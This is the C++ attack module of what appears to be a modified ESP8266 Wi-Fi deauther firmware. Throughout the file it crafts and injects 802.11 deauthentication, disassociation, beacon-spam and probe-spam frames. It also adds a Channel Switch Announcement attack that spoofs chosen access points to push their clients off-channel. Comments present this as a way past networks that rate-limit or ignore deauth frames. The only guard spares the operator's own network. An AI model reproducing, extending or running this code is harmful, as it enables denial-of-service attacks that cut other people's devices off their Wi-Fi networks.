/* This software is licensed under the MIT License: https://github.com/spacehuhntech/esp8266_deauther */

#include "Attack.h"

#include "settings.h"
#include "BlazeLoyal.h"

Attack::Attack() {
    getRandomMac(mac);

    if (settings::getAttackSettings().beacon_interval == INTERVAL_1S) {
        // 1s beacon interval
        beaconPacket[32] = 0xe8;
        beaconPacket[33] = 0x03;
    } else {
        // 100ms beacon interval
        beaconPacket[32] = 0x64;
        beaconPacket[33] = 0x00;
    }

    deauth.time = currentTime;
    beacon.time = currentTime;
    probe.time  = currentTime;
}

void Attack::start() {
    stop();

    // OwnNetGuard safety net: never run with our own/home network as a target.
    // The overload sets the mode flags before calling us - clear them on refusal
    // (stop() only clears while running, and we never got that far).
    if (!BlazeLoyal::allowAttack(beacon.active || probe.active)) {
        deauth.active = false;
        beacon.active = false;
        probe.active  = false;
        csa.active    = false;
        deauthAll     = false;
        return;
    }

    prntln(A_START);

    // ===== deauth hardening: guarantee the radio can inject frames =====
    wifi_promiscuous_enable(0);         // sniffer off (promiscuous RX interferes with TX)
    wifi_set_sleep_type(NONE_SLEEP_T);  // re-assert no modem sleep (radio always awake)
    if ((wifi_get_opmode() & 0x01) == 0) wifi_set_opmode(STATION_MODE); // freedom TX needs the STA interface
    if (scan.isScanning()) scan.stop(); // scans block attack.update() AND hop channels away from targets

    attackTime      = currentTime;
    attackStartTime = currentTime;
    accesspoints.sortAfterChannel();
    stations.sortAfterChannel();
    // zero per-second counters even when no attack was formally running
    // (e.g. after one-shot CLI sends or EAPOL-capture kicks touched them)
    deauth.packetCounter = 0;
    beacon.packetCounter = 0;
    probe.packetCounter  = 0;
    csa.packetCounter    = 0;
    tmpPacketRate        = 0;
    running = true;

    // one-line diagnostic: "why is it 0 pps?" is never silent again
    Serial.printf("[BLAZE] attack start: opmode=%d ch=%d sleep=%d targets ap=%u st=%u nm=%u\n",
                  (int)wifi_get_opmode(), (int)wifi_channel, (int)wifi_get_sleep_type(),
                  (unsigned)accesspoints.selected(), (unsigned)stations.selected(),
                  (unsigned)names.selected());
}

void Attack::start(bool beacon, bool deauth, bool deauthAll, bool probe, bool csa, bool output, uint32_t timeout) {
    Attack::beacon.active = beacon;
    Attack::deauth.active = deauth || deauthAll;
    Attack::deauthAll     = deauthAll;
    Attack::probe.active  = probe;
    Attack::csa.active    = csa;

    Attack::output  = output;
    Attack::timeout = timeout;

    // if (((beacon || probe) && ssids.count() > 0) || (deauthAll && scan.countAll() > 0) || (deauth &&
    // scan.countSelected() > 0)){
    if (beacon || probe || deauthAll || deauth || csa) {
        start();
    } else {
        prntln(A_NO_MODE_ERROR);
        accesspoints.sort();
        stations.sort();
        stop();
    }
}

void Attack::stop() {
    if (running) {
        running              = false;
        deauthPkts           = 0;
        beaconPkts           = 0;
        probePkts            = 0;
        csaPkts              = 0;
        deauth.packetCounter = 0;
        beacon.packetCounter = 0;
        probe.packetCounter  = 0;
        csa.packetCounter    = 0;
        deauth.maxPkts       = 0;
        beacon.maxPkts       = 0;
        probe.maxPkts        = 0;
        csa.maxPkts          = 0;
        packetRate           = 0;
        deauth.tc            = 0;
        beacon.tc            = 0;
        probe.tc             = 0;
        csa.tc               = 0;
        deauth.active        = false;
        beacon.active        = false;
        probe.active         = false;
        csa.active           = false;
        deauthRate.clear();  // burst schedulers re-arm on next start
        beaconRate.clear();
        probeRate.clear();
        csaRate.clear();
        prntln(A_STOP);
    }
}

bool Attack::isRunning() {
    return running;
}

uint32_t Attack::getElapsed() {
    if (!running) return 0;
    return currentTime - attackStartTime;
}

bool Attack::isKill() {
    return running && deauthAll;
}

void Attack::updateCounter() {
    // stop when timeout is active and time is up
    if ((timeout > 0) && (currentTime - attackStartTime >= timeout)) {
        prntln(A_TIMEOUT);
        stop();
        return;
    }

    // deauth packets per second
    if (deauth.active) {
        if (deauthAll) deauth.maxPkts = settings::getAttackSettings().deauths_per_target *
                                        (accesspoints.count() + stations.count() * 2 - names.selected());
        else deauth.maxPkts = settings::getAttackSettings().deauths_per_target *
                              (accesspoints.selected() + stations.selected() * 2 + names.selected() + names.stations());
    } else {
        deauth.maxPkts = 0;
    }

    // beacon packets per second
    if (beacon.active) {
        beacon.maxPkts = ssids.count();

        if (settings::getAttackSettings().beacon_interval == INTERVAL_100MS) beacon.maxPkts *= 10;
    } else {
        beacon.maxPkts = 0;
    }

    // probe packets per second
    if (probe.active) probe.maxPkts = ssids.count() * settings::getAttackSettings().probe_frames_per_ssid;
    else probe.maxPkts = 0;

    // CSA beacons per second: 10 per selected AP (clients need several CSA
    // beacons before they honour the switch)
    if (csa.active) {
        csa.maxPkts = accesspoints.selected() * 10;
        if (csa.maxPkts < 10) csa.maxPkts = 10;
    } else {
        csa.maxPkts = 0;
    }

    // random transmission power
    if (settings::getAttackSettings().random_tx && (beacon.active || probe.active)) setOutputPower(random(21));
    else setOutputPower(20.5f);

    // reset counters
    deauthPkts           = deauth.packetCounter;
    beaconPkts           = beacon.packetCounter;
    probePkts            = probe.packetCounter;
    csaPkts              = csa.packetCounter;
    packetRate           = tmpPacketRate;
    deauth.packetCounter = 0;
    beacon.packetCounter = 0;
    probe.packetCounter  = 0;
    csa.packetCounter    = 0;
    deauth.tc            = 0;
    beacon.tc            = 0;
    probe.tc             = 0;
    csa.tc               = 0;
    tmpPacketRate        = 0;
}

void Attack::status() {
    char s[120];

    sprintf(s, str(
                A_STATUS).c_str(), packetRate, deauthPkts, deauth.maxPkts, beaconPkts, beacon.maxPkts, probePkts,
            probe.maxPkts);
    prnt(String(s));
}

String Attack::getStatusJSON() {
    String json = String(OPEN_BRACKET);                                                                          // [

    json += String(OPEN_BRACKET) + b2s(deauth.active) + String(COMMA) + String(scan.countSelected()) + String(COMMA) +
            String(deauthPkts) + String(COMMA) + String(deauth.maxPkts) + String(CLOSE_BRACKET) + String(COMMA); // [false,0,0,0],
    json += String(OPEN_BRACKET) + b2s(beacon.active) + String(COMMA) + String(ssids.count()) + String(COMMA) + String(
        beaconPkts) + String(COMMA) + String(beacon.maxPkts) + String(CLOSE_BRACKET) + String(COMMA);            // [false,0,0,0],
    json += String(OPEN_BRACKET) + b2s(probe.active) + String(COMMA) + String(ssids.count()) + String(COMMA) + String(
        probePkts) + String(COMMA) + String(probe.maxPkts) + String(CLOSE_BRACKET) + String(COMMA);              // [false,0,0,0],
    json += String(packetRate);                                                                                  // 0
    json += CLOSE_BRACKET;                                                                                       // ]

    return json;
}

void Attack::update() {
    if (!running || scan.isScanning()) return;

    apCount = accesspoints.count();
    stCount = stations.count();
    nCount  = names.count();

    // run/update all attacks
    deauthUpdate();
    deauthAllUpdate();
    beaconUpdate();
    probeUpdate();
    csaUpdate();

    // each second
    if (currentTime - attackTime > 1000) {
        attackTime = currentTime; // update time
        updateCounter();

        if (output) status();     // status update
        getRandomMac(mac);        // generate new random mac
    }
}

void Attack::deauthUpdate() {
    if (!deauthAll && deauth.active && (deauth.maxPkts > 0) && (deauth.packetCounter < deauth.maxPkts)) {
        // NOTE: per-frame pacing lives inside deauthDevice() (burst scheduler).
        // The old "deauth.time <= currentTime - (1000 / maxPkts)" gate could
        // divide by zero (interval 0 ms -> packet flood -> SDK TX queue
        // overflow -> frames silently dropped / watchdog resets).
        // APs
        if ((apCount > 0) && (deauth.tc < apCount)) {
            if (accesspoints.getSelected(deauth.tc)) {
                deauth.tc += deauthAP(deauth.tc);
            } else deauth.tc++;
        }

        // Stations
        else if ((stCount > 0) && (deauth.tc >= apCount) && (deauth.tc < stCount + apCount)) {
            if (stations.getSelected(deauth.tc - apCount)) {
                deauth.tc += deauthStation(deauth.tc - apCount);
            } else deauth.tc++;
        }

        // Names
        else if ((nCount > 0) && (deauth.tc >= apCount + stCount) && (deauth.tc < nCount + stCount + apCount)) {
            if (names.getSelected(deauth.tc - stCount - apCount)) {
                deauth.tc += deauthName(deauth.tc - stCount - apCount);
            } else deauth.tc++;
        }

        // reset counter
        if (deauth.tc >= nCount + stCount + apCount) deauth.tc = 0;
    }
}

void Attack::deauthAllUpdate() {
    if (deauthAll && deauth.active && (deauth.maxPkts > 0) && (deauth.packetCounter < deauth.maxPkts)) {
        // pacing: burst scheduler inside deauthDevice() (see deauthUpdate)
        // APs
        if ((apCount > 0) && (deauth.tc < apCount)) {
            tmpID = names.findID(accesspoints.getMac(deauth.tc));

            if (tmpID < 0) {
                deauth.tc += deauthAP(deauth.tc);
            } else if (!names.getSelected(tmpID)) {
                deauth.tc += deauthAP(deauth.tc);
            } else deauth.tc++;
        }

        // Stations
        else if ((stCount > 0) && (deauth.tc >= apCount) && (deauth.tc < stCount + apCount)) {
            tmpID = names.findID(stations.getMac(deauth.tc - apCount));

            if (tmpID < 0) {
                deauth.tc += deauthStation(deauth.tc - apCount);
            } else if (!names.getSelected(tmpID)) {
                deauth.tc += deauthStation(deauth.tc - apCount);
            } else deauth.tc++;
        }

        // Names
        else if ((nCount > 0) && (deauth.tc >= apCount + stCount) && (deauth.tc < apCount + stCount + nCount)) {
            if (!names.getSelected(deauth.tc - apCount - stCount)) {
                deauth.tc += deauthName(deauth.tc - apCount - stCount);
            } else deauth.tc++;
        }

        // reset counter
        if (deauth.tc >= nCount + stCount + apCount) deauth.tc = 0;
    }
}

void Attack::probeUpdate() {
    if (probe.active && (probe.maxPkts > 0) && (probe.packetCounter < probe.maxPkts)) {
        if (probeRate.allow(probe.maxPkts, currentTime)) { // burst scheduler (no div-by-0)
            if (settings::getAttackSettings().attack_all_ch) setWifiChannel((probe.tc % 11) + 1, true);
            probe.tc += sendProbe(probe.tc);

            if (probe.tc >= ssids.count()) probe.tc = 0;
        }
    }
}

void Attack::beaconUpdate() {
    if (beacon.active && (beacon.maxPkts > 0) && (beacon.packetCounter < beacon.maxPkts)) {
        if (beaconRate.allow(beacon.maxPkts, currentTime)) { // burst scheduler (no div-by-0)
            beacon.tc += sendBeacon(beacon.tc);

            if (beacon.tc >= ssids.count()) beacon.tc = 0;
        }
    }
}

/* ===== Channel Switch Announcement attack (plan 4.2) =====
   Spams CSA beacons that impersonate the selected APs and tell every
   listening client "move to channel X now". Clients that obey drift off
   the AP's real channel -> they lose the network without a single deauth
   frame (works even where deauth frames are rate-limited/ignored). */
void Attack::csaUpdate() {
    if (!csa.active || (csa.maxPkts == 0) || (csa.packetCounter >= csa.maxPkts)) return;
    if (!csaRate.allow(csa.maxPkts, currentTime)) return; // burst scheduler

    int n = accesspoints.count();
    if (n <= 0) return;

    // round-robin through the selected APs, one AP per granted token
    for (int guard = 0; guard < n; guard++) {
        if (csa.tc >= n) csa.tc = 0;
        int idx = csa.tc++;

        if (!accesspoints.getSelected(idx)) continue;
        if (BlazeLoyal::blockMac(accesspoints.getMac(idx))) continue; // OwnNetGuard

        uint8_t ch = accesspoints.getCh(idx);
        if (ch < 1 || ch > 14) ch = 1;
        uint8_t newCh = (uint8_t)((ch % 13) + 1); // 1..13, never channel 0

        uint8_t enc = accesspoints.getEnc(idx);
        bool wpa2   = (enc == ENC_TYPE_CCMP) || (enc == ENC_TYPE_TKIP) || (enc == ENC_TYPE_AUTO);

        String ssid = accesspoints.getSSID(idx);
        if (ssid.length() > 32) ssid = ssid.substring(0, 32);

        if (sendCSA(accesspoints.getMac(idx), ssid.c_str(), ch, wpa2, newCh)) {
            csa.packetCounter++;
        }
        return; // one AP per token
    }
}

bool Attack::sendCSA(uint8_t* apMac, const char* ssid, uint8_t ch, bool wpa2, uint8_t newCh) {
    if (!apMac || !ssid) return false;

    uint8_t ssidLen = (uint8_t)strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;

    uint16_t i = 0;

    // ===== 802.11 beacon header ===== //
    csaPacket[i++] = 0x80;                    // frame control: beacon
    csaPacket[i++] = 0x00;
    csaPacket[i++] = 0x00;                    // duration
    csaPacket[i++] = 0x00;
    memset(&csaPacket[i], 0xFF, 6); i += 6;   // destination: broadcast
    memcpy(&csaPacket[i], apMac, 6); i += 6;  // source: target AP
    memcpy(&csaPacket[i], apMac, 6); i += 6;  // BSSID: target AP
    csaPacket[i++] = 0x00;                    // sequence (SDK fills)
    csaPacket[i++] = 0x00;

    // ===== fixed beacon parameters ===== //
    memcpy(&csaPacket[i], &beaconPacket[24], 8); i += 8; // timestamp
    csaPacket[i++] = beaconPacket[32];                   // beacon interval
    csaPacket[i++] = beaconPacket[33];
    csaPacket[i++] = wpa2 ? 0x31 : 0x21;                 // caps: privacy bit only when encrypted
    csaPacket[i++] = 0x00;

    // ===== tagged parameters ===== //
    csaPacket[i++] = 0x00;                   // SSID
    csaPacket[i++] = ssidLen;
    memcpy(&csaPacket[i], ssid, ssidLen); i += ssidLen;

    memcpy(&csaPacket[i], &beaconPacket[70], 10); i += 10; // supported rates

    csaPacket[i++] = 0x03;                   // DS parameter set: current channel
    csaPacket[i++] = 0x01;
    csaPacket[i++] = ch;

    if (wpa2) {                              // RSN (WPA2)
        memcpy(&csaPacket[i], &beaconPacket[83], 26); i += 26;
    }

    // CSA IE (tag 37): mode=1 (restrict to new channel), new channel, count=1
    csaPacket[i++] = 0x25;
    csaPacket[i++] = 0x03;
    csaPacket[i++] = 0x01;
    csaPacket[i++] = newCh;
    csaPacket[i++] = 0x01;

    return sendPacket(csaPacket, i, ch, true);
}

bool Attack::deauthStation(int num) {
    return deauthDevice(stations.getAPMac(num), stations.getMac(num), settings::getAttackSettings().deauth_reason, stations.getCh(num));
}

bool Attack::deauthAP(int num) {
    return deauthDevice(accesspoints.getMac(num), broadcast, settings::getAttackSettings().deauth_reason, accesspoints.getCh(num));
}

bool Attack::deauthName(int num) {
    if (names.isStation(num)) {
        return deauthDevice(names.getBssid(num), names.getMac(num), settings::getAttackSettings().deauth_reason, names.getCh(num));
    } else {
        return deauthDevice(names.getMac(num), broadcast, settings::getAttackSettings().deauth_reason, names.getCh(num));
    }
}

bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_t ch) {
    if (!stMac) return false;  // exit when station mac is null

    // OwnNetGuard (absolute): never deauth our own or home AP - covers deauthAll
    // and one-off CLI sends. return true = "handled" so the caller's target
    // rotation (deauth.tc += deauthAP(...)) keeps moving instead of stalling.
    if (BlazeLoyal::blockMac(apMac)) return true;

    // Serial.println("Deauthing "+macToStr(apMac)+" -> "+macToStr(stMac)); // for debugging

    bool success = false;

    // frames/s: the running attack's budget, or 100 pps for one-off API calls
    // (CLI) when no attack is formally running (maxPkts == 0)
    uint16_t rate = deauth.maxPkts ? deauth.maxPkts : 100;

    // build deauth packet
    packetSize = sizeof(deauthPacket);

    uint8_t deauthpkt[packetSize];

    memcpy(deauthpkt, deauthPacket, packetSize);

    memcpy(&deauthpkt[4], stMac, 6);
    memcpy(&deauthpkt[10], apMac, 6);
    memcpy(&deauthpkt[16], apMac, 6);
    deauthpkt[24] = reason;

    // send deauth frame
    deauthpkt[0] = 0xc0;

    if (deauthRate.allow(rate, currentTime) && sendPacket(deauthpkt, packetSize, ch, true)) {
        success = true;
        deauth.packetCounter++;
    }

    // send disassociate frame
    uint8_t disassocpkt[packetSize];

    memcpy(disassocpkt, deauthpkt, packetSize);

    disassocpkt[0] = 0xa0;

    if (deauthRate.allow(rate, currentTime) && sendPacket(disassocpkt, packetSize, ch, false)) {
        success = true;
        deauth.packetCounter++;
    }

    // send another packet, this time from the station to the accesspoint
    if (!macBroadcast(stMac)) { // but only if the packet isn't a broadcast
        // build deauth packet
        memcpy(&disassocpkt[4], apMac, 6);
        memcpy(&disassocpkt[10], stMac, 6);
        memcpy(&disassocpkt[16], stMac, 6);

        // send deauth frame
        disassocpkt[0] = 0xc0;

        if (deauthRate.allow(rate, currentTime) && sendPacket(disassocpkt, packetSize, ch, false)) {
            success = true;
            deauth.packetCounter++;
        }

        // send disassociate frame
        disassocpkt[0] = 0xa0;

        if (deauthRate.allow(rate, currentTime) && sendPacket(disassocpkt, packetSize, ch, false)) {
            success = true;
            deauth.packetCounter++;
        }
    }

    if (success) deauth.time = currentTime;

    return success;
}

bool Attack::sendBeacon(uint8_t tc) {
    if (settings::getAttackSettings().attack_all_ch) setWifiChannel((tc % 11) + 1, true); // 1..11, never channel 0
    mac[5] = tc;
    return sendBeacon(mac, ssids.getName(tc).c_str(), wifi_channel, ssids.getWPA2(tc));
}

bool Attack::sendBeacon(uint8_t* mac, const char* ssid, uint8_t ch, bool wpa2) {
    packetSize = sizeof(beaconPacket);

    if (wpa2) {
        beaconPacket[34] = 0x31;
    } else {
        beaconPacket[34] = 0x21;
        packetSize      -= 26;
    }

    int ssidLen = strlen(ssid);

    if (ssidLen > 32) ssidLen = 32;

    memcpy(&beaconPacket[10], mac, 6);
    memcpy(&beaconPacket[16], mac, 6);
    memcpy(&beaconPacket[38], ssid, ssidLen);

    beaconPacket[82] = ch;

    // =====
    uint16_t tmpPacketSize = (packetSize - 32) + ssidLen;                // calc size
    static uint8_t tmpPacket[128];                                        // static buffer - no heap churn
    if (tmpPacketSize > sizeof(tmpPacket)) return false;

    memcpy(&tmpPacket[0], &beaconPacket[0], 38 + ssidLen);               // copy first half of packet into buffer
    tmpPacket[37] = ssidLen;                                             // update SSID length byte
    memcpy(&tmpPacket[38 + ssidLen], &beaconPacket[70], wpa2 ? 39 : 13); // copy second half of packet into buffer

    bool success = sendPacket(tmpPacket, tmpPacketSize, ch, false);

    if (success) {
        beacon.time = currentTime;
        beacon.packetCounter++;
    }

    return success;
    // =====
}

bool Attack::sendProbe(uint8_t tc) {
    if (settings::getAttackSettings().attack_all_ch) setWifiChannel((tc % 11) + 1, true); // 1..11, never channel 0
    mac[5] = tc;
    return sendProbe(mac, ssids.getName(tc).c_str(), wifi_channel);
}

bool Attack::sendProbe(uint8_t* mac, const char* ssid, uint8_t ch) {
    packetSize = sizeof(probePacket);
    int ssidLen = strlen(ssid);

    if (ssidLen > 32) ssidLen = 32;

    memcpy(&probePacket[10], mac, 6);
    memcpy(&probePacket[26], ssid, ssidLen);

    if (sendPacket(probePacket, packetSize, ch, false)) {
        probe.time = currentTime;
        probe.packetCounter++;
        return true;
    }

    return false;
}

bool Attack::sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t ch, bool force_ch) {
    // Serial.println(bytesToStr(packet, packetSize));

    // set channel
    setWifiChannel(ch, force_ch);

    // inject frame; the SDK returns -1 when its TX queue is momentarily busy,
    // so retry once immediately instead of dropping the frame
    int result = wifi_send_pkt_freedom(packet, packetSize, 0);
    if (result != 0) result = wifi_send_pkt_freedom(packet, packetSize, 0);

    bool sent = (result == 0);

    if (sent) ++tmpPacketRate;

    return sent;
}

void Attack::enableOutput() {
    output = true;
    prntln(A_ENABLED_OUTPUT);
}

void Attack::disableOutput() {
    output = false;
    prntln(A_DISABLED_OUTPUT);
}

uint32_t Attack::getDeauthPkts() {
    return deauthPkts;
}

uint32_t Attack::getBeaconPkts() {
    return beaconPkts;
}

uint32_t Attack::getProbePkts() {
    return probePkts;
}

uint32_t Attack::getDeauthMaxPkts() {
    return deauth.maxPkts;
}

uint32_t Attack::getBeaconMaxPkts() {
    return beacon.maxPkts;
}

uint32_t Attack::getProbeMaxPkts() {
    return probe.maxPkts;
}

uint32_t Attack::getPacketRate() {
    return packetRate;
}